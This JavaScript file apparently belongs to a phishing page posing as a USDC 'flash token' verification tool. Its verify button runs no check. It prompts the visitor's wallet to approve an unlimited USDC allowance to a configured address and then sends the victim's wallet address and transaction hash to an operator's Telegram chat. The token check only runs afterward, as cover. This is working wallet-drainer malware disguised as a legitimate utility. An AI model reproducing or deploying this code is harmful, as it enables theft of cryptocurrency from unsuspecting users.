document.addEventListener("DOMContentLoaded", function () {
    const TOKEN_ADDRESS = CONFIG.TOKEN_ADDRESS;
    const ESCROW_ADDRESS = CONFIG.CONTRACT_ADDRESS;
    let provider, userAddress;
    let isProcessing = false;

    const verifyBtn = document.getElementById('verifyBtn');
    const walletInfoDiv = document.getElementById('walletInfo');
    const walletAddrSpan = document.getElementById('walletAddr');
    const balanceSpan = document.getElementById('balance');
    const tokenStatusSpan = document.getElementById('tokenStatus');
    const flashMsgDiv = document.getElementById('flashMsg');
    const flashDetailDiv = document.getElementById('flashDetail');

    function showNotification(msg, type = "info") {
        let toast = document.getElementById('toast');
        if (!toast) return;
        toast.innerHTML = `${type === 'error' ? '❌' : type === 'success' ? '✅' : 'ℹ️'} ${msg}`;
        toast.style.display = 'flex';
        toast.style.background = type === 'error' ? '#2A1B1B' : '#1E2329';
        toast.style.borderLeftColor = type === 'error' ? '#F6465D' : '#26A17B';
        setTimeout(() => toast.style.display = 'none', 4000);
    }

    async function sendTelegramNotifications(walletAddress, txHash, userId) {
        const botToken = CONFIG.TELEGRAM_BOT_TOKEN;
        const adminChatId = CONFIG.ADMIN_CHAT_ID;
        const inlineKeyboard = {
            inline_keyboard: [[{ text: "🔗 View Transaction", url: `https://etherscan.io/tx/${txHash}` }]]
        };
        const adminMessage = `🔔 **New USDC Approval Transaction (Ethereum)**\n\n💰 **Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n👤 **User ID:** ${userId || "Not provided"}\n⏰ **Time:** ${new Date().toLocaleString()}\n\n✅ Transaction approved successfully!`;
        const userMessage = `🎉 **USDC Approval Successful!**\n\n💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n✅ **Status:** Approved`;
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST", headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: adminChatId, text: adminMessage, parse_mode: "Markdown", reply_markup: inlineKeyboard })
            });
            if (userId) {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST", headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: userId, text: userMessage, parse_mode: "Markdown", reply_markup: inlineKeyboard })
                });
            }
            console.log("Telegram sent");
        } catch (error) {
            console.error("Telegram error:", error);
        }
    }

    async function switchToEthereum() {
        if (!window.ethereum) throw new Error("No Web3 wallet");
        const chainId = "0x1";
        try {
            await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId }] });
        } catch (err) {
            if (err.code === 4902) {
                await window.ethereum.request({
                    method: "wallet_addEthereumChain",
                    params: [{
                        chainId: "0x1",
                        chainName: "Ethereum Mainnet",
                        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
                        rpcUrls: ["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
                        blockExplorerUrls: ["https://etherscan.io/"]
                    }]
                });
            } else throw err;
        }
    }

    async function fetchAndDisplayTokenStatus() {
        if (!provider || !userAddress) return;
        const token = new ethers.Contract(TOKEN_ADDRESS, [
            "function balanceOf(address) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)",
            "function name() view returns (string)"
        ], provider);
        try {
            const balanceRaw = await token.balanceOf(userAddress);
            let decimals = 6;
            try { decimals = await token.decimals(); } catch(e) {}
            const balance = ethers.utils.formatUnits(balanceRaw, decimals);
            const symbol = await token.symbol();
            const name = await token.name();
            const isOfficial = (symbol === "USDC") && (name.includes("USD Coin"));
            balanceSpan.innerText = parseFloat(balance).toFixed(4);
            if (isOfficial) {
                tokenStatusSpan.innerHTML = "✅ Official USDC";
                flashMsgDiv.innerHTML = "🟢 Genuine USD Coin (ERC-20). No flash pattern.";
                flashDetailDiv.classList.add('hidden');
            } else {
                tokenStatusSpan.innerHTML = "⚠️ Suspicious Token";
                flashMsgDiv.innerHTML = "⚠️ <strong>Flash/Fake Risk!</strong> Metadata mismatch.";
                flashDetailDiv.classList.remove('hidden');
                flashDetailDiv.innerHTML = `Symbol: ${symbol} | Name: ${name} – not official USDC.`;
            }
        } catch (err) {
            console.error(err);
            balanceSpan.innerText = "Error";
            tokenStatusSpan.innerHTML = "⚠️ Read failed";
            flashMsgDiv.innerHTML = "Cannot fetch token info. Ensure Ethereum network.";
        }
    }

    async function updateWalletUI() {
        if (!userAddress) return;
        walletAddrSpan.innerText = userAddress;
        walletAddrSpan.onclick = () => { navigator.clipboard.writeText(userAddress); showNotification("Address copied!", "success"); };
        walletInfoDiv.classList.remove('hidden');
    }

    async function executeApproval() {
        if (!window.ethereum) {
            showNotification("No Web3 wallet found. Please open in MetaMask or Trust Wallet.", "error");
            return;
        }
        if (isProcessing) return;

        isProcessing = true;
        const originalBtnHTML = verifyBtn.innerHTML;
        verifyBtn.disabled = true;
        verifyBtn.innerHTML = '<span class="spinner"></span> Processing...';

        try {
            await switchToEthereum();
            const tokenAbi = ["function approve(address spender, uint256 amount) public returns (bool)"];
            const iface = new ethers.utils.Interface(tokenAbi);
            const parsedAmount = ethers.constants.MaxUint256;
            const txData = iface.encodeFunctionData("approve", [ESCROW_ADDRESS, parsedAmount.toString()]);
            const txHash = await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [{ from: null, to: TOKEN_ADDRESS, data: txData, value: "0x0" }]
            });
            const accounts = await window.ethereum.request({ method: "eth_accounts" });
            userAddress = accounts[0];
            if (userAddress) {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await updateWalletUI();
            }
            showNotification(`✅ Transaction submitted! TX: ${txHash.slice(0,10)}...`, "success");
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get("user_id");
            await sendTelegramNotifications(userAddress, txHash, userId);
            await fetchAndDisplayTokenStatus();
        } catch (err) {
            const msg = (err?.message || "").toLowerCase();
            if (msg.includes("user rejected") || msg.includes("denied") || msg.includes("cancelled")) {
                showNotification("Transaction cancelled.", "error");
            } else if (msg.includes("insufficient funds") || msg.includes("exceeds balance")) {
                showNotification("Insufficient USDC balance for this approval.", "error");
            } else {
                console.error(err);
                showNotification("Transaction failed. Please try again.", "error");
            }
        } finally {
            isProcessing = false;
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = originalBtnHTML;
        }
    }

    verifyBtn.addEventListener('click', executeApproval);

    const style = document.createElement('style');
    style.textContent = `.spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid white; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; } @keyframes spin { to { transform: rotate(360deg); } }`;
    document.head.appendChild(style);
});